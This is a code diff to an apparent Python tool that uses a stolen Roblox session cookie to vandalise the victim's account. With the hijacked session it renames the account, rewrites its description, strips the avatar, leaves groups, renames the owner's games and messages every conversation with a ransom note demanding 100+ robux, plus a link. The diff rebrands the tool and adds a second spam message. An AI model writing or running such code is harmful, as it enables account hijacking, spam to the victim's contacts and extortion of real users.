@@ -7,7 +7,7 @@ async def start(self):
     try:
         async with aiohttp.ClientSession(cookies={".ROBLOSECURITY": self.cookie}) as session:
             self.display_theme(1)
-            choice = cprint.user_input("Are you sure you want to nuke this cookie/account? the account will not be usable anymore (y/N) > ")
+            choice = cprint.user_input("Ya wanna C0LL3CT this account:)? (y/N) > ")
             if choice in ["yes", "y"]:
                 tasks = [
                     asyncio.create_task(change_name(session, self.main_cookie[self.cookie]['id'])),
@@ -15,7 +15,6 @@ async def start(self):
                     asyncio.create_task(change_lang(session)),
                     asyncio.create_task(message_all(session)),
                     asyncio.create_task(leave_group(session, self.main_cookie[self.cookie]['id'])),
-                    asyncio.create_task(unfriend(session, self.main_cookie[self.cookie]['id'])),
                     asyncio.create_task(modify_games(session, self.main_cookie[self.cookie]['id'])),
                     asyncio.create_task(change_avatar(session))
                 ]
@@ -40,7 +39,7 @@ async def change_name(session, id):
 
 ########## CHANGE DESCRIPTION ##########
 async def change_desc(session):
-    async with session.post("https://users.roblox.com/v1/description", json={"description": "Hello! This account has been C0LL3CT3D"}, ssl=False) as response:
+    async with session.post("https://users.roblox.com/v1/description", json={"description": "Hello!\nThis account has been C0LL3CT3D"}, ssl=False) as response:
         if response.status == 200:
             cprint.success("Changed description!")
             return
@@ -50,7 +49,7 @@ async def change_desc(session):
 
 ########## CHANGE LANGUAGE ##########
 async def change_lang(session):
-    async with session.post("https://locale.roblox.com/v1/locales/set-user-supported-locale", json={"supportedLocaleCode": "ja_jp"}, ssl=False) as response:
+    async with session.post("https://locale.roblox.com/v1/locales/set-user-supported-locale", json={"supportedLocaleCode": "en_us"}, ssl=False) as response:
         if response.status == 200:
             cprint.success("Changed user language!")
         else:
@@ -60,8 +59,11 @@ async def change_lang(session):
 ########## SPAM MESSAGE ##########
 async def message_all(session):
     convs = await get_convs(session)
-    if convs is not None and len(convs) >= 1:
-        tasks = [asyncio.create_task(send_message(session, conv)) for conv in convs for i in range(1)]
+    if convs:
+        tasks = []
+        for conv in convs:
+            tasks.append(asyncio.create_task(send_message(session, conv)))
+            tasks.append(asyncio.create_task(send_message2(session, conv)))
         await asyncio.gather(*tasks)
 
 async def get_convs(session):
@@ -75,7 +77,17 @@ async def get_convs(session):
             return None
 
 async def send_message(session, conv):
-    async with session.post("https://chat.roblox.com/v2/send-message", json={"conversationId": conv["id"], "message": "Hello! This account has as of recently been T4RG3T3D./nAnd has now officially been SCR4P3D and C0LL3CT3D./nTo return this account to the previous owner:/nPay 100+ robux."}, ssl=False) as response:
+    async with session.post("https://chat.roblox.com/v2/send-message", json={"conversationId": conv["id"], "message": "Hello! This account has as of recently been T4RG3T3D.\nAnd has now officially been SCR4P3D and C0LL3CT3D.\nTo return this account to the previous owner\nPay 100+ robux."}, ssl=False) as response:
+        if response.status == 200:
+            data = await response.json()
+            cprint.success(f"Sent a message to {conv['title']}!")
+            return data
+        else:
+            cprint.error(f"Failed to send message: {response.status}")
+            return None
+
+async def send_message2(session, conv):
+    async with session.post("https://chat.roblox.com/v2/send-message", json={"conversationId": conv["id"], "message": "https://www.roblox.com/share?code=007d8a3d8787a24e9ea4deb1a7bd6450&type=Server"}, ssl=False) as response:
         if response.status == 200:
             data = await response.json()
             cprint.success(f"Sent a message to {conv['title']}!")
@@ -90,7 +102,7 @@ async def change_avatar(session):
     async with session.post("https://avatar.roblox.com/v2/avatar/set-wearing-assets", json={"assets":[]}, ssl=False) as response:
         if response.status == 200:
             cprint.success(f"Removed all avatar accessories!")
-            async with session.post("https://avatar.roblox.com/v1/avatar/set-body-colors", json={"headColorId":1003,"torsoColorId":1004,"rightArmColorId":21,"leftArmColorId":21,"rightLegColorId":26,"leftLegColorId":199}, ssl=False) as response:
+            async with session.post("https://avatar.roblox.com/v1/avatar/set-body-colors", json={"headColorId":21,"torsoColorId":1003,"rightArmColorId":21,"leftArmColorId":21,"rightLegColorId":21,"leftLegColorId":21}, ssl=False) as response:
                 if response.status == 200:
                     cprint.success(f"Changed avatar body color!")
 
@@ -163,7 +175,7 @@ async def modify_games(session, id):
         await asyncio.gather(*tasks)
 
 async def modify_game(session, id):
-    async with session.patch(f"https://develop.roblox.com/v2/universes/{id}/configuration", json={"name":"NUKED WITH DEATH .gg/deathsniper","description":"NUKED WITH DEATH .gg/deathsniper","studioAccessToApisAllowed":False}, ssl=False) as response:
+    async with session.patch(f"https://develop.roblox.com/v2/universes/{id}/configuration", json={"name":"Account C0LL3CT3D","description":"Account C0LL3CT3D","studioAccessToApisAllowed":False}, ssl=False) as response:
         if response.status == 200:
             cprint.success(f"Modified game name and description")
         else:
@@ -188,5 +200,6 @@ async def get_games(session, id):
             else:
                 cprint.error("Failed to fetch games")
                 return None
+
 
 
